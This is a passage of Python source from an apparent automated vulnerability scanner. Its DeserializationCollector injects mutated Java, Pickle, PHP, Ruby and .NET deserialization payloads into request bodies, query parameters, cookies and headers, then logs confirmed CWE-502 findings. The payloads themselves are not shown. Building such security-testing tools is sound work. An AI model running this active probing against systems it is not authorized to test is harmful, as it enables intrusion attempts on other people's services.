        if not matched_sig_name:
            for fmt_name, catalog in signature_catalogs.items():
                if fmt_name == target_fmt:
                    continue
                for sig_name, pattern in catalog.items():
                    match = pattern.search(body)
                    if match:
                        matched_sig_name = f"{fmt_name}_{sig_name}"
                        matched_format = fmt_name
                        start = max(0, match.start() - 40)
                        end = min(len(body), match.end() + 100)
                        matched_snippet = body[start:end].strip().replace("\r", " ").replace("\n", " ")
                        break
                if matched_sig_name:
                    break

        if not matched_sig_name or not matched_snippet:
            return None

        # Baseline Subtraction: verify the signature wasn't already in baseline
        if baseline_response is not None:
            base_body = getattr(baseline_response, "body", "") or getattr(baseline_response, "raw_body", "") or ""
            if isinstance(base_body, bytes):
                base_body = base_body.decode("latin1", errors="ignore")
            # If the same signature matches baseline, suppress finding
            for catalog in signature_catalogs.values():
                for _, pattern in catalog.items():
                    if pattern.search(base_body) and pattern.search(body):
                        # Both matched same pattern
                        if pattern.search(matched_snippet):
                            return None

        # False Positive Rejection: Verbatim Reflection Check
        # If the body is just an echo of the payload without real stack traces or error signatures outside the echo
        if payload_str and payload_str in body:
            # If the matched signature occurs ONLY inside the echoed payload string, suppress
            cleaned_body = body.replace(payload_str, "")
            is_real_error = False
            for catalog in signature_catalogs.values():
                for _, pattern in catalog.items():
                    if pattern.search(cleaned_body):
                        is_real_error = True
                        break
                if is_real_error:
                    break
            if not is_real_error:
                return None

        # False Positive Rejection: Benign HTML / Documentation Mentions without error status or traces
        status_code = getattr(response, "status_code", 200) or 200
        injected_elapsed = getattr(response, "elapsed", 0.0) or 0.0
        baseline_elapsed = getattr(baseline_response, "elapsed", 0.0) if baseline_response else 0.0
        delay_delta = max(0.0, injected_elapsed - baseline_elapsed)

        return DeserializationResult(
            format=matched_format,
            technique=technique,
            mutation_strategy=mutation,
            severity=expected_severity,
            confidence=expected_confidence,
            payload=payload_str,
            matched_signature=matched_sig_name,
            evidence_snippet=matched_snippet,
            parameter=parameter_name,
            parameter_type=parameter_type,
            status_code=status_code,
            delay_delta=delay_delta,
            baseline_elapsed=baseline_elapsed,
            injected_elapsed=injected_elapsed,
            is_valid_finding=True,
            template_id=template_id,
        )


class DeserializationCollector(BaseCollector):
    """
    Collector testing discovered endpoints, parameters, cookies, and custom headers
    for Insecure Deserialization vulnerabilities.
    """

    COMMON_DESERIALIZATION_PARAMS = [
        "data",
        "payload",
        "state",
        "viewstate",
        "session",
        "token",
        "object",
        "serialized",
        "cmd",
        "callback",
        "query",
        "item",
        "target",
        "profile",
        "config",
        "auth",
        "credentials",
        "context",
    ]

    COMMON_DESERIALIZATION_COOKIES = [
        "session",
        "session_id",
        "user_session",
        "auth_token",
        "state",
        "data",
        "profile",
        "token",
        "remember_me",
        "user",
    ]

    COMMON_DESERIALIZATION_HEADERS = [
        "X-Serialized-Payload",
        "X-ViewState",
        "X-Token",
        "X-Session-Data",
        "X-Object",
        "Authorization",
    ]

    def __init__(
        self,
        http_client: Optional[Any] = None,
        timeout: float = 10.0,
        max_probes_per_endpoint: int = 30,
    ) -> None:
        self.http_client = http_client
        self.timeout = timeout
        self.max_probes_per_endpoint = max_probes_per_endpoint
        self.payload_generator = DeserializationPayloadGenerator()
        self.analyzer = DeserializationAnalyzer()

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Union[str, bytes, Dict[str, Any]]] = None,
        json_data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Executes an HTTP request with polymorphic support for different client interfaces.
        """
        method = method.upper()
        req_headers = dict(headers or {})
        req_cookies = dict(cookies or {})

        try:
            if self.http_client is not None:
                client = self.http_client
                if method == "GET" and hasattr(client, "get"):
                    try:
                        return client.get(
                            mission, url, params=params, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return client.get(url, params=params, headers=req_headers, cookies=req_cookies)

                if method == "POST" and hasattr(client, "post"):
                    kwargs: Dict[str, Any] = {"headers": req_headers, "cookies": req_cookies}
                    if params:
                        kwargs["params"] = params
                    if json_data is not None:
                        kwargs["json"] = json_data
                    if data is not None:
                        kwargs["data"] = data
                    try:
                        return client.post(mission, url, timeout=self.timeout, **kwargs)
                    except TypeError:
                        return client.post(url, **kwargs)

                if hasattr(client, "request"):
                    try:
                        return client.request(
                            mission,
                            method=method,
                            url=url,
                            params=params,
                            data=data,
                            json=json_data,
                            headers=req_headers,
                            cookies=req_cookies,
                            timeout=self.timeout,
                        )
                    except TypeError:
                        return client.request(
                            method=method,
                            url=url,
                            params=params,
                            data=data,
                            json=json_data,
                            headers=req_headers,
                            cookies=req_cookies,
                        )

                if callable(client):
                    return client(
                        method=method,
                        url=url,
                        params=params,
                        data=data,
                        json=json_data,
                        headers=req_headers,
                        cookies=req_cookies,
                    )

            # Fallback to AuthenticatedHttpClient context manager
            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(
                        mission, url, params=params, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                    )
                elif method == "POST":
                    return client.post(
                        mission, url, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                    )
                else:
                    return client.request(
                        mission, method, url, params=params, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                    )
        except Exception as e:
            logger.debug(f"DeserializationCollector: HTTP request to {url} failed: {e}")

        return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active insecure deserialization testing against discovered endpoints.
        """
        raw_mission = getattr(mission, "_mission", mission)
        endpoints = list(getattr(raw_mission, "endpoints", []) or [])
        live_hosts = list(getattr(raw_mission, "live_hosts", []) or [])
        target = str(getattr(raw_mission, "target", "") or "")

        # Fallback target synthesis if endpoints is empty
        if not endpoints:
            if live_hosts:
                for lh in live_hosts:
                    url = lh.get("url", lh) if isinstance(lh, dict) else str(lh)
                    if url:
                        endpoints.append({"url": url, "method": "GET"})
            elif target:
                endpoints.append({"url": target if target.startswith("http") else f"http://{target}", "method": "GET"})

        if not endpoints:
            logger.info("DeserializationCollector: No endpoints or targets discovered.")
            return []

        detected_evidence: List[Evidence] = []
        confirmed_findings: Set[str] = set()

        all_mutated_payloads = self.payload_generator.generate_mutated_payloads()

        for ep in endpoints:
            if isinstance(ep, dict):
                target_url = ep.get("url") or ""
                ep_method = (ep.get("method") or "GET").upper()
                body = ep.get("body")
                headers = ep.get("headers") or {}
                cookies = ep.get("cookies") or {}
                query_params = ep.get("params") or {}
            else:
                target_url = str(ep)
                ep_method = "GET"
                body = None
                headers = {}
                cookies = {}
                query_params = {}

            if not target_url or not target_url.startswith("http"):
                continue

            parsed_url = urllib.parse.urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

            # Baseline measurement
            baseline_resp = self._execute_request(
                mission,
                method=ep_method,
                url=target_url,
                params=query_params if query_params else None,
                data=body if isinstance(body, (str, bytes)) else None,
                json_data=body if isinstance(body, dict) else None,
                headers=headers,
                cookies=cookies,
            )

            # Channel 1: POST Body (JSON / Form / Raw bytes)
            if ep_method == "POST" or body is not None:
                # 1A: JSON Fields
                if isinstance(body, dict):
                    keys_to_fuzz = list(body.keys()) or ["data"]
                    for k in keys_to_fuzz:
                        for p_info in all_mutated_payloads[: self.max_probes_per_endpoint]:
                            finding_key = f"{target_url}:json:{k}:{p_info['format']}"
                            if finding_key in confirmed_findings:
                                continue

                            fuzzed_json = dict(body)
                            fuzzed_json[k] = p_info["payload"]
                            resp = self._execute_request(
                                mission,
                                method="POST",
                                url=target_url,
                                json_data=fuzzed_json,
                                headers={"Content-Type": "application/json", **headers},
                                cookies=cookies,
                            )
                            if resp:
                                res = self.analyzer.analyze_response(
                                    resp, p_info, baseline_response=baseline_resp, parameter_name=k, parameter_type="json_field"
                                )
                                if res and res.is_valid_finding:
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=k,
                                        param_type="json_field",
                                        payload=p_info["payload"],
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        result=res,
                                    )
                                    detected_evidence.append(ev)
                                    confirmed_findings.add(finding_key)
                                    break
                else:
                    # 1B: Raw POST Body / Form Body
                    for p_info in all_mutated_payloads[: self.max_probes_per_endpoint]:
                        finding_key = f"{target_url}:body:{p_info['format']}"
                        if finding_key in confirmed_findings:
                            continue

                        ct = p_info.get("content_type", "application/x-www-form-urlencoded")
                        req_hdrs = {"Content-Type": ct, **headers}
                        raw_data = p_info.get("raw_bytes") if "raw_bytes" in p_info else p_info["payload"]

                        resp = self._execute_request(
                            mission,
                            method="POST",
                            url=target_url,
                            data=raw_data,
                            headers=req_hdrs,
                            cookies=cookies,
                        )
                        if resp:
                            res = self.analyzer.analyze_response(
                                resp, p_info, baseline_response=baseline_resp, parameter_name="body", parameter_type="post_body"
                            )
                            if res and res.is_valid_finding:
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=target_url,
                                    base_url=base_url,
                                    param="body",
                                    param_type="post_body",
                                    payload=str(p_info["payload"]),
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    result=res,
                                )
                                detected_evidence.append(ev)
                                confirmed_findings.add(finding_key)
                                break

            # Channel 2: GET Query Parameters
            url_query = parsed_url.query
            parsed_params = urllib.parse.parse_qs(url_query)
            params_to_test = list(parsed_params.keys()) if parsed_params else self.COMMON_DESERIALIZATION_PARAMS[:5]

            for param_name in params_to_test:
                for p_info in all_mutated_payloads[: self.max_probes_per_endpoint]:
                    finding_key = f"{target_url}:query:{param_name}:{p_info['format']}"
                    if finding_key in confirmed_findings:
                        continue

                    # Craft query string
                    test_params = dict(query_params)
                    test_params[param_name] = p_info["payload"]
                    resp = self._execute_request(
                        mission,
                        method="GET",
                        url=target_url,
                        params=test_params,
                        headers=headers,
                        cookies=cookies,
                    )
                    if resp:
                        res = self.analyzer.analyze_response(
                            resp, p_info, baseline_response=baseline_resp, parameter_name=param_name, parameter_type="query_param"
                        )
                        if res and res.is_valid_finding:
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=target_url,
                                base_url=base_url,
                                param=param_name,
                                param_type="query_param",
                                payload=str(p_info["payload"]),
                                status_code=getattr(resp, "status_code", 200) or 200,
                                result=res,
                            )
                            detected_evidence.append(ev)
                            confirmed_findings.add(finding_key)
                            break

            # Channel 3: Cookies
            cookies_to_test = list(cookies.keys()) if cookies else self.COMMON_DESERIALIZATION_COOKIES[:4]
            for cookie_name in cookies_to_test:
                for p_info in all_mutated_payloads[: self.max_probes_per_endpoint]:
                    finding_key = f"{target_url}:cookie:{cookie_name}:{p_info['format']}"
                    if finding_key in confirmed_findings:
                        continue

                    test_cookies = dict(cookies)
                    test_cookies[cookie_name] = p_info["payload"]
                    resp = self._execute_request(
                        mission,
                        method="GET",
                        url=target_url,
                        headers=headers,
                        cookies=test_cookies,
                    )
                    if resp:
                        res = self.analyzer.analyze_response(
                            resp, p_info, baseline_response=baseline_resp, parameter_name=cookie_name, parameter_type="cookie"
                        )
                        if res and res.is_valid_finding:
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=target_url,
                                base_url=base_url,
                                param=cookie_name,
                                param_type="cookie",
                                payload=str(p_info["payload"]),
                                status_code=getattr(resp, "status_code", 200) or 200,
                                result=res,
                            )
                            detected_evidence.append(ev)
                            confirmed_findings.add(finding_key)
                            break

            # Channel 4: Custom Headers
            for header_name in self.COMMON_DESERIALIZATION_HEADERS:
                for p_info in all_mutated_payloads[: self.max_probes_per_endpoint]:
                    finding_key = f"{target_url}:header:{header_name}:{p_info['format']}"
                    if finding_key in confirmed_findings:
                        continue

                    test_headers = dict(headers)
                    test_headers[header_name] = p_info["payload"]
                    resp = self._execute_request(
                        mission,
                        method=ep_method,
                        url=target_url,
                        headers=test_headers,
                        cookies=cookies,
                    )
                    if resp:
                        res = self.analyzer.analyze_response(
                            resp, p_info, baseline_response=baseline_resp, parameter_name=header_name, parameter_type="header"
                        )
                        if res and res.is_valid_finding:
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=target_url,
                                base_url=base_url,
                                param=header_name,
                                param_type="header",
                                payload=str(p_info["payload"]),
                                status_code=getattr(resp, "status_code", 200) or 200,
                                result=res,
                            )
                            detected_evidence.append(ev)
                            confirmed_findings.add(finding_key)
                            break

        logger.info(
            f"DeserializationCollector complete: {len(detected_evidence)} insecure deserialization finding(s) confirmed."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        result: DeserializationResult,
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = result.template_id or "deserialization"
        fmt = result.format
        technique = result.technique
        severity = result.severity
        confidence = result.confidence
        snippet = result.evidence_snippet
        mutation = result.mutation_strategy

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        format_labels = {
            DeserializationFormat.JAVA.value: "Java ObjectInputStream",
            DeserializationFormat.PYTHON_PICKLE.value: "Python Pickle",
            DeserializationFormat.PHP_SERIALIZE.value: "PHP Serialize",
            DeserializationFormat.RUBY_MARSHAL.value: "Ruby Marshal",
            DeserializationFormat.DOTNET_VIEWSTATE.value: ".NET ViewState",
            DeserializationFormat.DOTNET_BINARY_FORMATTER.value: ".NET BinaryFormatter",
        }
        fmt_label = format_labels.get(fmt, fmt.title())

        title = f"Insecure Deserialization ({fmt_label}): {param} on {target_url}"
        description = (
            f"Insecure deserialization vulnerability ({fmt_label} / {mutation}) confirmed on endpoint {target_url} "
            f"via {param_type} '{param}' using payload: '{payload[:100]}...'. "
            f"Evidence signature: {result.matched_signature}. Snippet: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="deserialization",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="deserialization_validation_collector",
            ),
            tags=["deserialization", "insecure_deserialization", "cwe-502", fmt, technique, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "deserialization",
                "severity": severity,
                "confidence": confidence,
                "format": fmt,
                "technique": technique,
                "mutation_strategy": mutation,
                "matched_signature": result.matched_signature,
                "template_id": template_id,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
                "delay_delta": result.delay_delta,
                "baseline_elapsed": result.baseline_elapsed,
                "injected_elapsed": result.injected_elapsed,
                "cwe_id": "CWE-502",
                "cvss_score": 9.8 if severity == Severity.CRITICAL.value else 8.5,
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"Insecure Deserialization ({fmt_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "format": fmt,
                "technique": technique,
                "mutation_strategy": mutation,
                "cwe_id": "CWE-502",
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"Insecure Deserialization ({fmt_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Safe publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)


# Backwards compatibility aliases
InsecureDeserializationCollector = DeserializationCollector
DeserializationValidationCollector = DeserializationCollector
